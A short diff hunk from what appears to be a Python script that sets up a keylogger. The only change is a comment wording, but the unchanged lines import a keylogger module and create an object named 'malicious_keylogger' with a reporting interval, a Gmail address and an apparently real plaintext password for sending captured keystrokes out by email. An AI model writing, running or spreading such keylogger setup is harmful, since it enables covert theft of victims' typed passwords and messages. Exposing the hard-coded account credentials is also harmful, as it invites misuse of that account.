@@ -3,7 +3,7 @@
 import keylogger
 
 
-# Initialize / create keylogger
+# Initialize - start keylogger
 
 malicious_keylogger = keylogger.KeyLogger(10, 'testKeylogger@gmail.com', 'G231ur567I@n1M$')
 
